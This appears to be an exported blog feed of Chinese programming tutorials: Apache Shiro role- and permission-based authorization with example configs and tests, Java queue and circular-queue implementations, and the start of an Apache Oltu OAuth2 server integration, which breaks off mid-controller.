    <content type="text"><![CDATA[授权授权，也叫访问控制，即在应用中控制谁能访问哪些资源（如访问页面/编辑数据/页面操作等）。在授权中需了解的几个关键对象：主体（Subject）、资源（Resource）、权限（Permission）、角色（Role）。 主体主体，即访问应用的用户，在 Shiro 中使用 Subject 代表该用户。用户只有授权后才允许访问相应的资源。 资源在应用中用户可以访问的任何东西，比如访问 JSP 页面、查看/编辑某些数据、访问某个业务方法、打印文本等等都是资源。用户只要授权后才能访问。 权限安全策略中的原子授权单位，通过权限我们可以表示在应用中用户有没有操作某个资源的权力。即权限表示在应用中用户能不能访问某个资源，如： 访问用户列表页面查看/新增/修改/删除用户数据（即很多时候都是 CRUD（增查改删）式权限控制）打印文档等等。。。 如上可以看出，权限代表了用户有没有操作某个资源的权利，即反映在某个资源上的操作允不允许，不反映谁去执行这个操作。所以后续还需要把权限赋予给用户，即定义哪个用户允许在某个资源上做什么操作（权限），Shiro 不会去做这件事情，而是由实现人员提供。 Shiro 支持粗粒度权限（如用户模块的所有权限）和细粒度权限（操作某个用户的权限，即实例级别的），后续部分介绍。 角色角色代表了操作集合，可以理解为权限的集合，一般情况下我们会赋予用户角色而不是权限，即这样用户可以拥有一组权限，赋予权限时比较方便。典型的如：项目经理、技术总监、CTO、开发工程师等都是角色，不同的角色拥有一组不同的权限。 隐式角色：即直接通过角色来验证用户有没有操作权限，如在应用中 CTO、技术总监、开发工程师可以使用打印机，假设某天不允许开发工程师使用打印机，此时需要从应用中删除相应代码；再如在应用中 CTO、技术总监可以查看用户、查看权限；突然有一天不允许技术总监查看用户、查看权限了，需要在相关代码中把技术总监角色从判断逻辑中删除掉；即粒度是以角色为单位进行访问控制的，粒度较粗；如果进行修改可能造成多处代码修改。 显示角色：在程序中通过权限控制谁能访问某个资源，角色聚合一组权限集合；这样假设哪个角色不能访问某个资源，只需要从角色代表的权限集合中移除即可；无须修改多处代码；即粒度是以资源/实例为单位的；粒度较细。 请 google 搜索“RBAC”和“RBAC新解”分别了解“基于角色的访问控制”“基于资源的访问控制(Resource-Based Access Control)”。 授权方式Shiro 支持三种方式的授权： 编程式：通过写 if/else 授权代码块完成： 123456Subject subject = SecurityUtils.getSubject();if(subject.hasRole(“admin”)) &#123; //有权限&#125; else &#123; //无权限&#125;&amp;nbsp; 注解式：通过在执行的 Java 方法上放置相应的注解完成： 1234@RequiresRoles(&quot;admin&quot;)public void hello() &#123; //有权限&#125;&amp;nbsp; 没有权限将抛出相应的异常； JSP/GSP 标签：在 JSP/GSP 页面通过相应的标签完成： 123&lt;shiro:hasRole name=&quot;admin&quot;&gt;&lt;!— 有权限 —&gt;&lt;/shiro:hasRole&gt;&amp;nbsp; 后续部分将详细介绍如何使用。 授权基于角色的访问控制（隐式角色） 1、在 ini 配置文件配置用户拥有的角色（shiro-role.ini） 123[users]zhang=123,role1,role2wang=123,role1&amp;nbsp; 规则即：“用户名=密码,角色1，角色2”，如果需要在应用中判断用户是否有相应角色，就需要在相应的 Realm 中返回角色信息，也就是说 Shiro 不负责维护用户-角色信息，需要应用提供，Shiro 只是提供相应的接口方便验证，后续会介绍如何动态的获取用户角色。 2、测试用例（com.github.zhangkaitao.shiro.chapter3.RoleTest） 12345678910111213@Testpublic void testHasRole() &#123; login(&quot;classpath:shiro-role.ini&quot;, &quot;zhang&quot;, &quot;123&quot;); //判断拥有角色：role1 Assert.assertTrue(subject().hasRole(&quot;role1&quot;)); //判断拥有角色：role1 and role2 Assert.assertTrue(subject().hasAllRoles(Arrays.asList(&quot;role1&quot;, &quot;role2&quot;))); //判断拥有角色：role1 and role2 and !role3 boolean[] result = subject().hasRoles(Arrays.asList(&quot;role1&quot;, &quot;role2&quot;, &quot;role3&quot;)); Assert.assertEquals(true, result[0]); Assert.assertEquals(true, result[1]); Assert.assertEquals(false, result[2]);&#125;&amp;nbsp; Shiro 提供了 hasRole/hasRole 用于判断用户是否拥有某个角色/某些权限；但是没有提供如 hashAnyRole 用于判断是否有某些权限中的某一个。 12345678@Test(expected = UnauthorizedException.class)public void testCheckRole() &#123; login(&quot;classpath:shiro-role.ini&quot;, &quot;zhang&quot;, &quot;123&quot;); //断言拥有角色：role1 subject().checkRole(&quot;role1&quot;); //断言拥有角色：role1 and role3 失败抛出异常 subject().checkRoles(&quot;role1&quot;, &quot;role3&quot;);&#125;&amp;nbsp; Shiro 提供的 checkRole/checkRoles 和 hasRole/hasAllRoles 不同的地方是它在判断为假的情况下会抛出 UnauthorizedException 异常。 到此基于角色的访问控制（即隐式角色）就完成了，这种方式的缺点就是如果很多地方进行了角色判断，但是有一天不需要了那么就需要修改相应代码把所有相关的地方进行删除；这就是粗粒度造成的问题。 基于资源的访问控制（显示角色） 1、在 ini 配置文件配置用户拥有的角色及角色-权限关系（shiro-permission.ini） 123456[users]zhang=123,role1,role2wang=123,role1[roles]role1=user:create,user:updaterole2=user:create,user:delete&amp;nbsp; 规则：“用户名=密码，角色 1，角色 2”“角色=权限 1，权限 2”，即首先根据用户名找到角色，然后根据角色再找到权限；即角色是权限集合；Shiro 同样不进行权限的维护，需要我们通过 Realm 返回相应的权限信息。只需要维护“用户——角色”之间的关系即可。 2、测试用例（com.github.zhangkaitao.shiro.chapter3.PermissionTest） 12345678910@Testpublic void testIsPermitted() &#123; login(&quot;classpath:shiro-permission.ini&quot;, &quot;zhang&quot;, &quot;123&quot;); //判断拥有权限：user:create Assert.assertTrue(subject().isPermitted(&quot;user:create&quot;)); //判断拥有权限：user:update and user:delete Assert.assertTrue(subject().isPermittedAll(&quot;user:update&quot;, &quot;user:delete&quot;)); //判断没有权限：user:view Assert.assertFalse(subject().isPermitted(&quot;user:view&quot;));&#125;&amp;nbsp; Shiro 提供了 isPermitted 和 isPermittedAll 用于判断用户是否拥有某个权限或所有权限，也没有提供如 isPermittedAny 用于判断拥有某一个权限的接口。 12345678910@Test(expected = UnauthorizedException.class)public void testCheckPermission () &#123; login(&quot;classpath:shiro-permission.ini&quot;, &quot;zhang&quot;, &quot;123&quot;); //断言拥有权限：user:create subject().checkPermission(&quot;user:create&quot;); //断言拥有权限：user:delete and user:update subject().checkPermissions(&quot;user:delete&quot;, &quot;user:update&quot;); //断言拥有权限：user:view 失败抛出异常 subject().checkPermissions(&quot;user:view&quot;);&#125;&amp;nbsp; 但是失败的情况下会抛出 UnauthorizedException 异常。 到此基于资源的访问控制（显示角色）就完成了，也可以叫基于权限的访问控制，这种方式的一般规则是“资源标识符：操作”，即是资源级别的粒度；这种方式的好处就是如果要修改基本都是一个资源级别的修改，不会对其他模块代码产生影响，粒度小。但是实现起来可能稍微复杂点，需要维护“用户——角色，角色——权限（资源：操作）”之间的关系。 Permission字符串通配符权限规则：“资源标识符：操作：对象实例 ID” 即对哪个资源的哪个实例可以进行什么操作。其默认支持通配符权限字符串，“:”表示资源/操作/实例的分割；“,”表示操作的分割；“*”表示任意资源/操作/实例。 1、单个资源单个权限 1subject().checkPermissions(&quot;system:user:update&quot;); 用户拥有资源“system:user”的“update”权限。 2、单个资源多个权限 1role41=system:user:update,system:user:delete 然后通过如下代码判断 1subject().checkPermissions(&quot;system:user:update&quot;, &quot;system:user:delete&quot;); 用户拥有资源“system:user”的“update”和“delete”权限。如上可以简写成： ini 配置（表示角色4拥有 system:user 资源的 update 和 delete 权限） 1role42=&quot;system:user:update,delete&quot; 接着可以通过如下代码判断 1subject().checkPermissions(&quot;system:user:update,delete&quot;); 通过“system:user:update,delete”验证“system:user:update, system:user:delete”是没问题的，但是反过来是规则不成立。 3、单个资源全部权限 ini 配置 1role51=&quot;system:user:create,update,delete,view&quot; 然后通过如下代码判断 1subject().checkPermissions(&quot;system:user:create,delete,update:view&quot;); 用户拥有资源“system:user”的“create”、“update”、“delete”和“view”所有权限。如上可以简写成： ini 配置文件（表示角色 5 拥有 system:user 的所有权限） 1role52=system:user:* 也可以简写为（推荐上边的写法）： 1role53=system:user 然后通过如下代码判断 12subject().checkPermissions(&quot;system:user:*&quot;);subject().checkPermissions(&quot;system:user&quot;);&amp;nbsp; 通过“system:user:*”验证“system:user:create,delete,update:view”可以，但是反过来是不成立的。 4、所有资源全部权限 ini 配置 1role61=*:view 然后通过如下代码判断 1subject().checkPermissions(&quot;user:view&quot;); 用户拥有所有资源的“view”所有权限。假设判断的权限是“”system:user:view”，那么需要“role5=::view”这样写才行 5、实例级别的权限 单个实例单个权限 ini 配置 1role71=user:view:1 对资源 user 的 1 实例拥有 view 权限。 然后通过如下代码判断 1subject().checkPermissions(&quot;user:view:1&quot;); 单个实例多个权限 ini 配置 1role72=&quot;user:update,delete:1&quot; 对资源 user 的 1 实例拥有 update、delete 权限。 然后通过如下代码判断 12subject().checkPermissions(&quot;user:delete,update:1&quot;);subject().checkPermissions(&quot;user:update:1&quot;, &quot;user:delete:1&quot;);&amp;nbsp; 单个实例所有权限 ini 配置 1role73=user:*:1 对资源 user 的 1 实例拥有所有权限。 然后通过如下代码判断 1subject().checkPermissions(&quot;user:update:1&quot;, &quot;user:delete:1&quot;, &quot;user:view:1&quot;); 所有实例单个权限 ini 配置 1role74=user:auth:* 对资源 user 的 1 实例拥有所有权限。 然后通过如下代码判断 1subject().checkPermissions(&quot;user:auth:1&quot;, &quot;user:auth:2&quot;); 所有实例所有权限 ini 配置 1role75=user:*:* 对资源 user 的 1 实例拥有所有权限。 然后通过如下代码判断 1subject().checkPermissions(&quot;user:view:1&quot;, &quot;user:auth:2&quot;); 6、Shiro 对权限字符串缺失部分的处理 如“user:view”等价于“user:view:*”；而“organization”等价于“organization:*”或者“organization:*:*”。可以这么理解，这种方式实现了前缀匹配。 另外如“user:*”可以匹配如“user:delete”、“user:delete”可以匹配如“user:delete:1”、“user:*:1”可以匹配如“user:view:1”、“user”可以匹配“user:view”或“user:view:1”等。即*可以匹配所有，不加*可以进行前缀匹配；但是如“*:view”不能匹配“system:user:view”，需要使用“*:*:view”，即后缀匹配必须指定前缀（多个冒号就需要多个*来匹配）。 7、WildcardPermission 如下两种方式是等价的： 12subject().checkPermission(&quot;menu:view:1&quot;);subject().checkPermission(new WildcardPermission(&quot;menu:view:1&quot;));&amp;nbsp; 因此没什么必要的话使用字符串更方便。 8、性能问题 通配符匹配方式比字符串相等匹配来说是更复杂的，因此需要花费更长时间，但是一般系统的权限不会太多，且可以配合缓存来提供其性能，如果这样性能还达不到要求我们可以实现位操作算法实现性能更好的权限匹配。另外实例级别的权限验证如果数据量太大也不建议使用，可能造成查询权限及匹配变慢。可以考虑比如在sql查询时加上权限字符串之类的方式在查询时就完成了权限匹配。 授权流程 流程如下： 首先调用 Subject.isPermitted*/hasRole*接口，其会委托给 SecurityManager，而 SecurityManager 接着会委托给 Authorizer； Authorizer 是真正的授权者，如果我们调用如 isPermitted(“user:view”)，其首先会通过 PermissionResolver 把字符串转换成相应的 Permission 实例； 在进行授权之前，其会调用相应的 Realm 获取 Subject 相应的角色/权限用于匹配传入的角色/权限； Authorizer 会判断 Realm 的角色/权限是否和传入的匹配，如果有多个 Realm，会委托给 ModularRealmAuthorizer 进行循环判断，如果匹配如 isPermitted*/hasRole* 会返回 true，否则返回 false 表示授权失败。 ModularRealmAuthorizer 进行多 Realm 匹配流程： 首先检查相应的 Realm 是否实现了实现了 Authorizer； 如果实现了 Authorizer，那么接着调用其相应的 isPermitted*/hasRole* 接口进行匹配； 如果有一个 Realm 匹配那么将返回 true，否则返回 false。 如果 Realm 进行授权的话，应该继承 AuthorizingRealm，其流程是： 如果调用 hasRole*，则直接获取 AuthorizationInfo.getRoles() 与传入的角色比较即可；首先如果调用如 isPermitted(“user:view”)，首先通过 PermissionResolver 将权限字符串转换成相应的 Permission 实例，默认使用 WildcardPermissionResolver，即转换为通配符的 WildcardPermission； 通过 AuthorizationInfo.getObjectPermissions() 得到 Permission 实例集合；通过 AuthorizationInfo.getStringPermissions() 得到字符串集合并通过 PermissionResolver 解析为 Permission 实例；然后获取用户的角色，并通过 RolePermissionResolver 解析角色对应的权限集合（默认没有实现，可以自己提供）； 接着调用 Permission.implies(Permission p) 逐个与传入的权限比较，如果有匹配的则返回 true，否则 false。 Authorizer、PermissionResolver及RolePermissionResolverAuthorizer 的职责是进行授权（访问控制），是 Shiro API 中授权核心的入口点，其提供了相应的角色/权限判断接口，具体请参考其 Javadoc。SecurityManager 继承了 Authorizer 接口，且提供了 ModularRealmAuthorizer 用于多 Realm 时的授权匹配。PermissionResolver 用于解析权限字符串到 Permission 实例，而 RolePermissionResolver 用于根据角色解析相应的权限集合。 我们可以通过如下 ini 配置更改 Authorizer 实现： 12authorizer=org.apache.shiro.authz.ModularRealmAuthorizersecurityManager.authorizer=$authorizer&amp;nbsp; 对于 ModularRealmAuthorizer，相应的 AuthorizingSecurityManager 会在初始化完成后自动将相应的 realm 设置进去，我们也可以通过调用其 setRealms() 方法进行设置。对于实现自己的 authorizer 可以参考 ModularRealmAuthorizer 实现即可，在此就不提供示例了。 设置 ModularRealmAuthorizer 的 permissionResolver，其会自动设置到相应的 Realm 上（其实现了 PermissionResolverAware 接口），如： 12permissionResolver=org.apache.shiro.authz.permission.WildcardPermissionResolverauthorizer.permissionResolver=$permissionResolver&amp;nbsp; 设置 ModularRealmAuthorizer 的 rolePermissionResolver，其会自动设置到相应的 Realm 上（其实现了 RolePermissionResolverAware 接口），如： 12rolePermissionResolver=com.github.zhangkaitao.shiro.chapter3.permission.MyRolePermissionResolverauthorizer.rolePermissionResolver=$rolePermissionResolver&amp;nbsp; 示例 1、ini 配置（shiro-authorizer.ini） 1234567891011121314[main]\#自定义authorizerauthorizer=org.apache.shiro.authz.ModularRealmAuthorizer\#自定义permissionResolver\#permissionResolver=org.apache.shiro.authz.permission.WildcardPermissionResolverpermissionResolver=com.github.zhangkaitao.shiro.chapter3.permission.BitAndWildPermissionResolverauthorizer.permissionResolver=$permissionResolver\#自定义rolePermissionResolverrolePermissionResolver=com.github.zhangkaitao.shiro.chapter3.permission.MyRolePermissionResolverauthorizer.rolePermissionResolver=$rolePermissionResolversecurityManager.authorizer=$authorizer\#自定义realm 一定要放在securityManager.authorizer赋值之后（因为调用setRealms会将realms设置给authorizer，并给各个Realm设置permissionResolver和rolePermissionResolver）realm=com.github.zhangkaitao.shiro.chapter3.realm.MyRealmsecurityManager.realms=$realm&amp;nbsp; 设置 securityManager 的 realms 一定要放到最后，因为在调用 SecurityManager.setRealms 时会将 realms 设置给 authorizer，并为各个 Realm 设置 permissionResolver 和 rolePermissionResolver。另外，不能使用 IniSecurityManagerFactory 创建的 IniRealm，因为其初始化顺序的问题可能造成后续的初始化 Permission 造成影响。 2、定义 BitAndWildPermissionResolver 及 BitPermission BitPermission 用于实现位移方式的权限，如规则是： 权限字符串格式：+ 资源字符串 + 权限位 + 实例 ID；以 + 开头中间通过 + 分割；权限：0 表示所有权限；1 新增（二进制：0001）、2 修改（二进制：0010）、4 删除（二进制：0100）、8 查看（二进制：1000）；如 +user+10 表示对资源 user 拥有修改 / 查看权限。 12345678910111213141516171819202122232425262728293031323334353637383940public class BitPermission implements Permission &#123; private String resourceIdentify; private int permissionBit; private String instanceId; public BitPermission(String permissionString) &#123; String[] array = permissionString.split(&quot;\\+&quot;); if(array.length &gt; 1) &#123; resourceIdentify = array[1]; &#125; if(StringUtils.isEmpty(resourceIdentify)) &#123; resourceIdentify = &quot;*&quot;; &#125; if(array.length &gt; 2) &#123; permissionBit = Integer.valueOf(array[2]); &#125; if(array.length &gt; 3) &#123; instanceId = array[3]; &#125; if(StringUtils.isEmpty(instanceId)) &#123; instanceId = &quot;*&quot;; &#125; &#125; @Override public boolean implies(Permission p) &#123; if(!(p instanceof BitPermission)) &#123; return false; &#125; BitPermission other = (BitPermission) p; if(!(&quot;*&quot;.equals(this.resourceIdentify) || this.resourceIdentify.equals(other.resourceIdentify))) &#123; return false; &#125; if(!(this.permissionBit ==0 || (this.permissionBit &amp; other.permissionBit) != 0)) &#123; return false; &#125; if(!(&quot;*&quot;.equals(this.instanceId) || this.instanceId.equals(other.instanceId))) &#123; return false; &#125; return true; &#125;&#125;&amp;nbsp; Permission 接口提供了 boolean implies(Permission p) 方法用于判断权限匹配的； 123456789public class BitAndWildPermissionResolver implements PermissionResolver &#123; @Override public Permission resolvePermission(String permissionString) &#123; if(permissionString.startsWith(&quot;+&quot;)) &#123; return new BitPermission(permissionString); &#125; return new WildcardPermission(permissionString); &#125;&#125;&amp;nbsp; BitAndWildPermissionResolver 实现了 PermissionResolver 接口，并根据权限字符串是否以 “+” 开头来解析权限字符串为 BitPermission 或 WildcardPermission。 3、定义 MyRolePermissionResolver RolePermissionResolver 用于根据角色字符串来解析得到权限集合。 123456789public class MyRolePermissionResolver implements RolePermissionResolver &#123; @Override public Collection&lt;Permission&gt; resolvePermissionsInRole(String roleString) &#123; if(&quot;role1&quot;.equals(roleString)) &#123; return Arrays.asList((Permission)new WildcardPermission(&quot;menu:*&quot;)); &#125; return null; &#125;&#125;&amp;nbsp; 此处的实现很简单，如果用户拥有 role1，那么就返回一个 “menu:*” 的权限。 4、自定义 Realm 1234567891011121314151617public class MyRealm extends AuthorizingRealm &#123; @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123; SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo(); authorizationInfo.addRole(&quot;role1&quot;); authorizationInfo.addRole(&quot;role2&quot;); authorizationInfo.addObjectPermission(new BitPermission(&quot;+user1+10&quot;)); authorizationInfo.addObjectPermission(new WildcardPermission(&quot;user1:*&quot;)); authorizationInfo.addStringPermission(&quot;+user2+10&quot;); authorizationInfo.addStringPermission(&quot;user2:*&quot;); return authorizationInfo; &#125; @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; //和com.github.zhangkaitao.shiro.chapter2.realm.MyRealm1. getAuthenticationInfo代码一样，省略&#125;&#125;&amp;nbsp; 此时我们继承 AuthorizingRealm 而不是实现 Realm 接口；推荐使用 AuthorizingRealm，因为： AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token)：表示获取身份验证信息；AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals)：表示根据用户身份获取授权信息。这种方式的好处是当只需要身份验证时只需要获取身份验证信息而不需要获取授权信息。对于 AuthenticationInfo 和 AuthorizationInfo 请参考其 Javadoc 获取相关接口信息。 另外我们可以使用 JdbcRealm，需要做的操作如下： 执行 sql/ shiro-init-data.sql 插入相关的权限数据； 使用 shiro-jdbc-authorizer.ini 配置文件，需要设置 jdbcRealm.permissionsLookupEnabled 为 true 来开启权限查询。 此次还要注意就是不能把我们自定义的如 “+user1+10” 配置到 INI 配置文件，即使有 IniRealm 完成，因为 IniRealm 在 new 完成后就会解析这些权限字符串，默认使用了WildcardPermissionResolver 完成，即此处是一个设计权限，如果采用生命周期（如使用初始化方法）的方式进行加载就可以解决我们自定义 permissionResolver 的问题。 5、测试用例 123456789101112131415public class AuthorizerTest extends BaseTest &#123; @Test public void testIsPermitted() &#123; login(&quot;classpath:shiro-authorizer.ini&quot;, &quot;zhang&quot;, &quot;123&quot;); //判断拥有权限：user:create Assert.assertTrue(subject().isPermitted(&quot;user1:update&quot;)); Assert.assertTrue(subject().isPermitted(&quot;user2:update&quot;)); //通过二进制位的方式表示权限 Assert.assertTrue(subject().isPermitted(&quot;+user1+2&quot;));//新增权限 Assert.assertTrue(subject().isPermitted(&quot;+user1+8&quot;));//查看权限 Assert.assertTrue(subject().isPermitted(&quot;+user2+10&quot;));//新增及查看 Assert.assertFalse(subject().isPermitted(&quot;+user1+4&quot;));//没有删除权限 Assert.assertTrue(subject().isPermitted(&quot;menu:view&quot;));//通过MyRolePermissionResolver解析得到的权限 &#125;&#125;&amp;nbsp; 通过如上步骤可以实现自定义权限验证了。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[队列]]></title>
    <url>%2F2018%2F11%2F05%2F%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[先入先出的数据结构 在 FIFO 数据结构中，将首先处理添加到队列中的第一个元素。 如上图所示，队列是典型的 FIFO 数据结构。插入（insert）操作也称作入队（enqueue），新元素始终被添加在队列的末尾。 删除（delete）操作也被称为出队（dequeue)。 你只能移除第一个元素。 队列 - 实现简单队列12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// &quot;static void main&quot; must be defined in a public class.class MyQueue &#123; // store elements private List&lt;Integer&gt; data; // a pointer to indicate the start position private int p_start; public MyQueue() &#123; data = new ArrayList&lt;Integer&gt;(); p_start = 0; &#125; /** Insert an element into the queue. Return true if the operation is successful. */ public boolean enQueue(int x) &#123; data.add(x); return true; &#125;; /** Delete an element from the queue. Return true if the operation is successful. */ public boolean deQueue() &#123; if (isEmpty() == true) &#123; return false; &#125; p_start++; return true; &#125; /** Get the front item from the queue. */ public int Front() &#123; return data.get(p_start); &#125; /** Checks whether the queue is empty or not. */ public boolean isEmpty() &#123; return p_start &gt;= data.size(); &#125; &#125;;public class Main &#123; public static void main(String[] args) &#123; MyQueue q = new MyQueue(); q.enQueue(5); q.enQueue(3); if (q.isEmpty() == false) &#123; System.out.println(q.Front()); &#125; q.deQueue(); if (q.isEmpty() == false) &#123; System.out.println(q.Front()); &#125; q.deQueue(); if (q.isEmpty() == false) &#123; System.out.println(q.Front()); &#125; &#125;&#125; 循环队列12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879class MyCircularQueue &#123; private int[] data; private int head; private int tail; private int size; /** Initialize your data structure here. Set the size of the queue to be k. */ public MyCircularQueue(int k) &#123; data = new int[k]; head = -1; tail = -1; size = k; &#125; /** Insert an element into the circular queue. Return true if the operation is successful. */ public boolean enQueue(int value) &#123; if (isFull() == true) &#123; return false; &#125; if (isEmpty() == true) &#123; head = 0; &#125; tail = (tail + 1) % size; data[tail] = value; return true; &#125; /** Delete an element from the circular queue. Return true if the operation is successful. */ public boolean deQueue() &#123; if (isEmpty() == true) &#123; return false; &#125; if (head == tail) &#123; head = -1; tail = -1; return true; &#125; head = (head + 1) % size; return true; &#125; /** Get the front item from the queue. */ public int Front() &#123; if (isEmpty() == true) &#123; return -1; &#125; return data[head]; &#125; /** Get the last item from the queue. */ public int Rear() &#123; if (isEmpty() == true) &#123; return -1; &#125; return data[tail]; &#125; /** Checks whether the circular queue is empty or not. */ public boolean isEmpty() &#123; return head == -1; &#125; /** Checks whether the circular queue is full or not. */ public boolean isFull() &#123; return ((tail + 1) % size) == head; &#125;&#125;/** * Your MyCircularQueue object will be instantiated and called as such: * MyCircularQueue obj = new MyCircularQueue(k); * boolean param_1 = obj.enQueue(value); * boolean param_2 = obj.deQueue(); * int param_3 = obj.Front(); * int param_4 = obj.Rear(); * boolean param_5 = obj.isEmpty(); * boolean param_6 = obj.isFull(); */]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
        <tag>队列</tag>
        <tag>FIFO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OAuth2]]></title>
    <url>%2F2018%2F11%2F03%2FOAuth2%2F</url>
    <content type="text"><![CDATA[OAuth2 集成目前很多开放平台如新浪微博开放平台都在使用提供开放 API 接口供开发者使用，随之带来了第三方应用要到开放平台进行授权的问题，OAuth 就是干这个的，OAuth2 是 OAuth 协议的下一个版本，相比 OAuth1，OAuth2 整个授权流程更简单安全了，但不兼容 OAuth1，具体可以到 OAuth2 官网 http://oauth.net/2/ 查看，OAuth2 协议规范可以参考 http://tools.ietf.org/html/rfc6749。目前有好多参考实现供选择，可以到其官网查看下载。 本文使用 Apache Oltu，其之前的名字叫 Apache Amber ，是 Java 版的参考实现。使用文档可参考 https://cwiki.apache.org/confluence/display/OLTU/Documentation。 OAuth 角色资源拥有者（resource owner）：能授权访问受保护资源的一个实体，可以是一个人，那我们称之为最终用户；如新浪微博用户 zhangsan；资源服务器（resource server）：存储受保护资源，客户端通过 access token 请求资源，资源服务器响应受保护资源给客户端；存储着用户 zhangsan 的微博等信息。授权服务器（authorization server）：成功验证资源拥有者并获取授权之后，授权服务器颁发授权令牌（Access Token）给客户端。客户端（client）：如新浪微博客户端 weico、微格等第三方应用，也可以是它自己的官方应用；其本身不存储资源，而是资源拥有者授权通过后，使用它的授权（授权令牌）访问受保护资源，然后客户端把相应的数据展示出来 / 提交到服务器。“客户端” 术语不代表任何特定实现（如应用运行在一台服务器、桌面、手机或其他设备）。 客户端从资源拥有者那请求授权。授权请求可以直接发给资源拥有者，或间接的通过授权服务器这种中介，后者更可取。 客户端收到一个授权许可，代表资源服务器提供的授权。 客户端使用它自己的私有证书及授权许可到授权服务器验证。 如果验证成功，则下发一个访问令牌。 客户端使用访问令牌向资源服务器请求受保护资源。 资源服务器会验证访问令牌的有效性，如果成功则下发受保护资源。 更多流程的解释请参考 OAuth2 的协议规范 http://tools.ietf.org/html/rfc6749。 服务器端本文把授权服务器和资源服务器整合在一起实现。 POM 依赖此处我们使用 apache oltu oauth2 服务端实现，需要引入 authzserver（授权服务器依赖）和 resourceserver（资源服务器依赖）。 12345678910&lt;dependency&gt; &lt;groupId&gt;org.apache.oltu.oauth2&lt;/groupId&gt; &lt;artifactId&gt;org.apache.oltu.oauth2.authzserver&lt;/artifactId&gt; &lt;version&gt;0.31&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.oltu.oauth2&lt;/groupId&gt; &lt;artifactId&gt;org.apache.oltu.oauth2.resourceserver&lt;/artifactId&gt; &lt;version&gt;0.31&lt;/version&gt;&lt;/dependency&gt;&amp;nbsp; 其他的请参考 pom.xml。 数据字典用户 (oauth2_user) 名称 类型 长度 描述 id bigint 10 编号 主键 username varchar 100 用户名 password varchar 100 密码 salt varchar 50 盐 客户端 (oauth2_client) 名称 类型 长度 描述 id bigint 10 编号 主键 client_name varchar 100 客户端名称 client_id varchar 100 客户端 id client_secret varchar 100 客户端安全 key 用户表存储着认证 / 资源服务器的用户信息，即资源拥有者；比如用户名 / 密码；客户端表存储客户端的的客户端 id 及客户端安全 key；在进行授权时使用。 表及数据 SQL具体请参考 sql/ shiro-schema.sql （表结构） sql/ shiro-data.sql （初始数据） 默认用户名 / 密码是 admin/123456。 实体具体请参考 com.github.zhangkaitao.shiro.chapter17.entity 包下的实体，此处就不列举了。 DAO具体请参考 com.github.zhangkaitao.shiro.chapter17.dao 包下的 DAO 接口及实现。 Service具体请参考 com.github.zhangkaitao.shiro.chapter17.service 包下的 Service 接口及实现。以下是出了基本 CRUD 之外的关键接口： 1234567891011121314151617181920212223242526272829public interface UserService &#123; public User createUser(User user);// 创建用户 public User updateUser(User user);// 更新用户 public void deleteUser(Long userId);// 删除用户 public void changePassword(Long userId, String newPassword); //修改密码 User findOne(Long userId);// 根据id查找用户 List&lt;User&gt; findAll();// 得到所有用户 public User findByUsername(String username);// 根据用户名查找用户&#125;public interface ClientService &#123; public Client createClient(Client client);// 创建客户端 public Client updateClient(Client client);// 更新客户端 public void deleteClient(Long clientId);// 删除客户端 Client findOne(Long clientId);// 根据id查找客户端 List&lt;Client&gt; findAll();// 查找所有 Client findByClientId(String clientId);// 根据客户端id查找客户端 Client findByClientSecret(String clientSecret);//根据客户端安全KEY查找客户端&#125;public interface OAuthService &#123; public void addAuthCode(String authCode, String username);// 添加 auth code public void addAccessToken(String accessToken, String username); // 添加 access token boolean checkAuthCode(String authCode); // 验证auth code是否有效 boolean checkAccessToken(String accessToken); // 验证access token是否有效 String getUsernameByAuthCode(String authCode);// 根据auth code获取用户名 String getUsernameByAccessToken(String accessToken);// 根据access token获取用户名 long getExpireIn();//auth code / access token 过期时间 public boolean checkClientId(String clientId);// 检查客户端id是否存在 public boolean checkClientSecret(String clientSecret);// 坚持客户端安全KEY是否存在&#125;&amp;nbsp; 此处通过 OAuthService 实现进行 auth code 和 access token 的维护。 后端数据维护控制器具体请参考 com.github.zhangkaitao.shiro.chapter17.web.controller 包下的 IndexController、LoginController、UserController 和 ClientController，其用于维护后端的数据，如用户及客户端数据；即相当于后台管理。 授权控制器 AuthorizeController12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091@Controllerpublic class AuthorizeController &#123; @Autowired private OAuthService oAuthService; @Autowired private ClientService clientService; @RequestMapping(&quot;/authorize&quot;) public Object authorize(Model model, HttpServletRequest request) throws URISyntaxException, OAuthSystemException &#123; try &#123; //构建OAuth 授权请求 OAuthAuthzRequest oauthRequest = new OAuthAuthzRequest(request); //检查传入的客户端id是否正确 if (!oAuthService.checkClientId(oauthRequest.getClientId())) &#123; OAuthResponse response = OAuthASResponse .errorResponse(HttpServletResponse.SC_BAD_REQUEST) .setError(OAuthError.TokenResponse.INVALID_CLIENT) .setErrorDescription(Constants.INVALID_CLIENT_DESCRIPTION) .buildJSONMessage(); return new ResponseEntity( response.getBody(), HttpStatus.valueOf(response.getResponseStatus())); &#125; Subject subject = SecurityUtils.getSubject(); //如果用户没有登录，跳转到登陆页面 if(!subject.isAuthenticated()) &#123; if(!login(subject, request)) &#123;//登录失败时跳转到登陆页面 model.addAttribute(&quot;client&quot;, clientService.findByClientId(oauthRequest.getClientId())); return &quot;oauth2login&quot;; &#125; &#125; String username = (String)subject.getPrincipal(); //生成授权码 String authorizationCode = null; //responseType目前仅支持CODE，另外还有TOKEN String responseType = oauthRequest.getParam(OAuth.OAUTH_RESPONSE_TYPE); if (responseType.equals(ResponseType.CODE.toString())) &#123; OAuthIssuerImpl oauthIssuerImpl = new OAuthIssuerImpl(new MD5Generator()); authorizationCode = oauthIssuerImpl.authorizationCode(); oAuthService.addAuthCode(authorizationCode, username); &#125; 